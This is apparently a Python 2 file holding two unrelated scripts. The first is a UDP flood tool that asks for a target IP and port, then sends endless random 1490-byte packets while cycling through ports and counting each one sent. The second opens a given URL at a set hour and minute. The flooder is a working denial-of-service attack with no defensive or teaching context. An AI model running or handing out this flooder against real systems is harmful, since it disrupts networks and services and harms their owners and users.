import sys
import os
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
os.system('figlet wSH')
ip = raw_input('IP : ')
port = input('port : ')
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "sent %s packet to %s through port : %s"%(sent,ip,port)
    if port ==65534:
        port = 1



import webbrowser
import datetime
hour = int(input('hour : '))
minute = int(input('minute : '))
url = str(input('url : '))
while True:
    now = str(datetime.datetime.now())
    h = int(now[11:13])
    m = int(now[14:16])
    if h == hour and m == minute :
        webbrowser.open(url)
        break